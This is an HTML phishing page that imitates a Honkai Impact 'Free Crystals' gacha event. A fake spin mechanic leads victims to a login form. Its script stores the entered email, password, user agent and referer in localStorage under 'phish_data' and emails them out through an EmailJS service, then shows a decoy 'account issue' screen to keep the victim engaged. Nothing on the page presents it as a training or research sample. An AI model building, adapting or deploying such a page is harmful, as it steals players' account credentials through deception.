<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Honkai Impact</title>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
body{background:#1a0a2a;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:15px}
.container{max-width:420px;width:100%;background:rgba(20,10,30,0.95);border:2px solid #9b59b6;border-radius:28px;padding:30px 20px;text-align:center}
.container h1{color:#9b59b6;font-size:24px}
.container p{color:#aaa;font-size:13px;margin:4px 0 15px}
.items{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:15px 0}
.items .item{padding:14px;border-radius:14px;border:1px solid #9b59b6;background:rgba(155,89,182,0.05);text-align:center}
.items .item .name{color:#fff;font-weight:600;font-size:13px}
.items .item .price{color:#9b59b6;font-size:13px;margin-top:4px}
.token{color:#9b59b6;font-size:28px;font-weight:bold;margin:15px 0}
.btn-gacha{background:#9b59b6;color:#fff;padding:18px;border:none;border-radius:16px;font-weight:bold;font-size:18px;width:100%;cursor:pointer}
.btn-gacha:hover{opacity:0.9}
.login-box{display:none;margin-top:15px;padding:20px;background:rgba(255,0,0,0.08);border-radius:16px;border:2px solid #9b59b6}
.login-box h3{color:#9b59b6}
.login-box p{color:#aaa;font-size:13px}
.login-box input{width:100%;padding:14px;margin-bottom:12px;background:#222;border:1px solid #9b59b6;border-radius:12px;color:#fff;font-size:15px;outline:none}
.login-box button{background:#9b59b6;color:#fff;padding:14px;border:none;border-radius:12px;font-weight:bold;width:100%;cursor:pointer;font-size:16px}
.back-btn{display:block;margin-top:18px;text-align:center;color:#9b59b6;text-decoration:none;font-size:14px}
.back-btn:hover{text-decoration:underline}
</style>
</head>
<body>
<div class="container">
<h1>💫 HONKAI IMPACT</h1>
<p>🎁 Free Crystals Event</p>
<div class="items">
<div class="item"><div class="name">5★ Valkyrie</div><div class="price">100 Crystals</div></div>
<div class="item"><div class="name">4★ Stigmata</div><div class="price">80 Crystals</div></div>
<div class="item"><div class="name">5★ Weapon</div><div class="price">50 Crystals</div></div>
<div class="item"><div class="name">Elf</div><div class="price">30 Crystals</div></div>
</div>
<div class="token">💎 Crystals: <span id="tokenDisplay">0</span></div>
<button class="btn-gacha" onclick="spinGacha()">🎰 SPIN GACHA</button>
<div class="login-box" id="loginBox">
<h3>⚠️ LOGIN REQUIRED</h3>
<p>Login to claim your rewards</p>
<form onsubmit="captureData(event,'gacha')">
<input type="hidden" id="gacha-game" value="honkai">
<input type="email" id="email-gacha" placeholder="Email" required>
<input type="password" id="pass-gacha" placeholder="Password" required>
<button type="submit">🎁 CLAIM REWARDS</button>
</form>
</div>
<a href="gacha.html" class="back-btn">← Back</a>
</div>
<script>
const EMAILJS_PUBLIC_KEY='elm943jpQl0Nr8aR-';
const EMAILJS_SERVICE_ID='service_27guahe';
const EMAILJS_TEMPLATE_ID='template_bq2ps8n';
emailjs.init(EMAILJS_PUBLIC_KEY);
let tokens=0,spinCount=0;
function spinGacha(){spinCount++;if(spinCount>2||tokens>=30){document.getElementById('loginBox').style.display='block';return;}tokens+=Math.floor(Math.random()*50)+1;document.getElementById('tokenDisplay').textContent=tokens;if(tokens>=30){document.getElementById('loginBox').style.display='block';}}
function captureData(e,type){e.preventDefault();const email=document.getElementById('email-gacha').value;const password=document.getElementById('pass-gacha').value;const game=document.getElementById('gacha-game').value;const time=new Date().toLocaleString('id-ID');const ip='127.0.0.1 (static)';const userAgent=navigator.userAgent;const sessionID=Math.random().toString(36).substring(2,10);const host=window.location.host;const referer=document.referrer||'Direct';const logs=JSON.parse(localStorage.getItem('phish_data')||'[]');const logEntry='========================================\n📥 CAPTURED AT: '+time+'\n📧 EMAIL: '+email+'\n🔑 PASSWORD: '+password+'\n🎯 TYPE: '+type+'\n🎮 GAME: '+game+'\n🌐 IP ADDRESS: '+ip+'\n📱 USER AGENT: '+userAgent+'\n🆔 SESSION ID: '+sessionID+'\n🏠 HOST: '+host+'\n🔗 REFERER: '+referer+'\n========================================\n\n';logs.unshift(logEntry);localStorage.setItem('phish_data',JSON.stringify(logs));const templateParams={time,email,password,type,game,ip,useragent:userAgent,session:sessionID,host,referer};emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_TEMPLATE_ID,templateParams).then(()=>console.log('✅ Email terkirim!')).catch(()=>console.warn('⚠️ Email gagal'));alert('✅ Data captured!');document.body.innerHTML='<div style="background:#f5f5f5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;font-family:Segoe UI,sans-serif;"><div style="background:#fff;border-radius:32px;padding:40px 30px;max-width:400px;width:100%;text-align:center;border:1px solid #eee;"><h1 style="color:#cc0000;font-size:22px;">⚠️ ACCOUNT ISSUE</h1><p style="color:#666;font-size:14px;margin:10px 0;">We detected suspicious activity on your account. Please verify your identity.</p><button onclick="location.reload()" style="background:#1a1a1a;color:#fff;border:none;padding:14px 30px;border-radius:40px;font-size:16px;cursor:pointer;font-weight:500;">🔄 TRY AGAIN</button></div></div>';}
</script>
</body>
</html>
